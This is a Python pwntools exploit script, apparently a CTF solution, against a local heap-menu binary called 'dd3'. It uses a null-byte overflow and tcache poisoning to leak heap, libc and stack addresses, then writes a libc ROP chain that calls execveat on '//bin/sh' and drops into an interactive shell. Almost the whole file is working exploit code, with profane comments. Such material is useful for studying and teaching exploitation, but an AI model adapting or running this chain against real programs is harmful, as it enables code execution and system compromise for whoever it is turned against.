from pwn import *
import os

from struct import pack

os.system('pwd')

r = None

def add(size, content=''):
    r.sendlineafter('> ', '1')
    r.sendlineafter('size: ', str(int(size)))
    r.sendlineafter('data: ', content)

def edit(index, content):
    r.sendlineafter('> ', '2')
    r.sendlineafter('index: ', str(index))
    r.sendlineafter('Input data: ', content)

def delete(index):
    r.sendlineafter('> ', '3')
    r.sendlineafter('index: ', str(index))

def read(index):
    r.sendlineafter('> ', '4')
    r.sendlineafter('index: ', str(index))
    

target = ELF('./dd3')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
# libc = ELF('./libc.so.6')

r = process('./dd3')
# r = process(['./ld-2.29.so', '--library-path', './', './dd3'])

# gdb.attach(r, gdbscript='c')

# print(hex(libc.symbols['environ']))

# raw_input()

#add(0xf8, 'A'*8)
#raw_input('bk1')
#add(0x128, 'B'*8)
#raw_input('bk1')
#edit(0, 'C'*0xf8)
#raw_input('bk2')

# 0x118 -> 0x120
# 0x128 -> 0x130
# 0xf0  -> 0x100

# fill the tcache

for x in range(7):
    add(0xf0)
for x in range(7):
    delete(x)

for x in range(7):
    add(0x128)
for x in range(7):
    delete(x)

# get tcache chunk size=0x130
add(0x128, 'A'*0x128) # 0
add(0x118, 'B'*0x118) # 1

# chunk_size-fake_chunk_size-fake_chunk_header ; header ; p64(0) to avoid 0a
# the fake chunk is used to bypass the next_chunk check of coalesing
add(0x118, 'C'*(0x120-0x20-0x08) + p64(0x21) + p64(0)*3) # 2

# free chunk 0 to put tcache->next inside chunk
delete(0)

# request previous freed chunk
add(0x128)

# leak tcache heap addr
read(0)

r.recvuntil(': ')
leaked_tcache_addr = u64(r.recvn(6).ljust(0x8, '\x00'))
log.success('tcache leaked addr: ' + hex(leaked_tcache_addr))

chunk0_addr = leaked_tcache_addr+0x1d6 # chunk0 addr

delete(0)

# create a fake chunk inside chunk0 to forge a bigger chunk size
# size = 0x241 because 0x10 bytes of chunk0 (0x130) will be used to write fake header, so its new size is 0x120, then
# chunk0_size+chunk1_size (which is also 0x120) = 0x240; + 0x01 (prev in use) = 0x241
add(0x128, p64(0) + p64(0x241) + p64(chunk0_addr)*2)

# overflow a null byte into C chunk size
# also, we can't send null bytes in edit, so we need to use the null byte append to clear the old data (0x42)
edit(1, 'E'*(0x110) + 'B'*8)
edit(1, 'E'*(0x110) + 'B'*7)
edit(1, 'E'*(0x110) + 'B'*6)
edit(1, 'E'*(0x110) + 'B'*5)
edit(1, 'E'*(0x110) + 'B'*4)
edit(1, 'E'*(0x110) + 'B'*3)
edit(1, 'E'*(0x110) + '\x40\x02')


log.info('Triggering coalesing...')
# trigger coalesing
delete(2)

# requesting chunk 0 to leak libc
# this will be a part of the coalesed chunk
add(0x110) # size = 110 so it will request from unsorted bin chunk | 

read(1)

r.recvuntil(': ')
main_arena_p96 = u64(r.recvn(6).ljust(8, '\x00'))
log.success('<main_arena+96> addr: ' + hex(main_arena_p96))
# log.success('main_arena+96 offset = ' + hex(libc.symbols['main_arena']))

libc_base = main_arena_p96 - 0x1bebe0
log.success('libc base addr: ' + hex(libc_base))

# malloc_hook = libc_base + libc.sym['__malloc_hook']
# log.success('__malloc_hook addr: ' + hex(malloc_hook))

# raw_input('1')

delete(0)

# raw_input('<g>')

log.info('clearing tcache to get the unsorted chunk')
# clear tcache to get the unsorted chunk
for i in range(7):
    add(0x128)

add(0x128, 'F'*8) # getting another part of coalesed chunk, where chunk1 originally was

# raw_input()

# delete last 2 allocated chunks
delete(8)
delete(9)

log.info('putting the environ address on chunk1->next')
log.info('and adding 0x01 because \\n in the final of string fucked me..')
# putting the environ address on chunk1->next
# need to add 0x01 because \n in the final of string fucked me
libc_environ = (libc_base + libc.symbols['environ'])-0x01
log.success('libc environ addr+0x01: ' + hex(libc_environ))


edit(1, 'B'*6 + p64(libc_environ)[:6])
edit(1, 'B'*5 + p64(libc_environ)[:6])
edit(1, 'B'*4 + p64(libc_environ)[:6])
edit(1, 'B'*3 + p64(libc_environ)[:6])
edit(1, 'B'*2 + p64(libc_environ)[:6])
edit(1, 'B'*1 + p64(libc_environ)[:6])
edit(1, 'B'*0 + p64(libc_environ)[:6])
# edit(1, p64(libc_environ)[:6])
# edit(1, 'B'*1 + p64(libc_environ)[:6])
# edit(1, p64(libc_environ)[:6])

# print()
add(0x128, 'A'*8)

add(0x128) # get the environ pointer

#print('opora')
# raw_input()

read(9)
r.recvuntil(': ')
data = r.recvn(7)[1:] # getting the fucking right addrs now bitch
stack_leak_addr = u64(data.ljust(8, '\x00'))
# print(repr(data))
log.success('Stack addr leaked: ' + hex(stack_leak_addr))

# fuck

# ...

# now execveat rop oh boi

# rop_addr = stack_leak_addr-0xf2
rop_addr = stack_leak_addr-0xf8-0x8
log.info('rop_addr: ' + hex(rop_addr))

log.info('starting rop chain')
# gdb.attach(r, gdbscript="c")

delete(7)
delete(8)

# edit(1, 'B'*6 + p64(rop_addr)[:6])
# edit(1, 'B'*5 + p64(rop_addr)[:6])
# edit(1, 'B'*4 + p64(rop_addr)[:6])
# edit(1, 'B'*3 + p64(rop_addr)[:6])
# edit(1, 'B'*2 + p64(rop_addr)[:6])
# edit(1, 'B'*1 + p64(rop_addr)[:6])
edit(1, 'B'*0 + p64(rop_addr)[:6])

# raw_input('<2>')

# 0x00000000000271ca: pop r14; pop r15; pop rbp; ret;                                                                                                                          

pop_rax_ret = 0x000000000003ee58
push_rax_ret = 0x000000000003acf3
pop_rbx_pop_r12_ret = 0x0000000000050fd7
pop_rdi_ret = 0x000000000002679e
push_rdi_ret = 0x0000000000165c7e
push_rsp_ret = 0x000000000003af99
pop_rsi_ret = 0x000000000003af9f
syscall_ret = 0x000000000005809a
push_rbx_ret = 0x00000000000f2099

# payload = '\x90'
# payload = p64(rop_addr+0x08) # ret addr
print('-> ' + hex(libc_base+push_rax_ret))



'''
rax -> 0x142
rdi -> /bin//sh
rsi -> ptr->/bin//sh
rdx -> 0x0
r10 -> 0x0
r8  -> 0x0

    mov rax, 0x142
    push rdx
    mov rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop rsi
    syscall

'''

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = libc_base # 705735f00b8523a7e976113bd87d6ed7f1a46e03bac45f4e42ffeb60dc51f888
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

pops_ca_final = 0x00000000000271ca

rop = ''
rop = p64(libc_base+pops_ca_final) # first ret addr appends a 'ca' in addr idk why
rop += p64(0x0)
rop += p64(0x0)
rop += p64(0x0)
rop += rebase_0(0x0000000000028869) # 0x0000000000028869: pop r13; ret; 
rop += '//bin/sh'
rop += rebase_0(0x000000000003137f) # 0x000000000003137f: pop rbx; ret; 
rop += rebase_0(0x00000000001be1a0)
rop += rebase_0(0x0000000000055fe2) # 0x0000000000055fe2: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000028869) # 0x0000000000028869: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x000000000003137f) # 0x000000000003137f: pop rbx; ret; 
rop += rebase_0(0x00000000001be1a8)
rop += rebase_0(0x0000000000055fe2) # 0x0000000000055fe2: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000002679e) # 0x000000000002679e: pop rdi; ret; 
rop += b'//bin/sh' #rebase_0(0x00000000001be1a0)
rop += rebase_0(0x0000000000027079) # 0x0000000000027079: pop rsi; ret;
rop += rebase_0(0x00000000001be1a0)
rop += rebase_0(0x00000000000cb18d) # 0x00000000000cb18d: pop rdx; ret;
rop += p64(0x0) #rebase_0(0x0)

rop += rebase_0(0x000000000003e86d) #0x000000000003e86d: xor r8d, r8d; mov rax, r8; ret; 
rop += rebase_0(0x000000000011b960) # 0x000000000011b960: xor r10d, r10d; mov eax, r10d; ret;                                                                                                                      


rop += rebase_0(0x000000000003ee58) # 0x000000000003ee58: pop rax; ret;
rop += p(0x142)
rop += rebase_0(0x000000000005809a) # 0x000000000005809a: syscall; ret;

gdb.attach(r, gdbscript='''c''')

log.info('Sending payload...')
add(0x128, 'A'*8)
add(0x128, rop) # allocated on rop_addr

# r.sendline('5')

log.success('PWNED!')
# r.recv()
r.interactive()
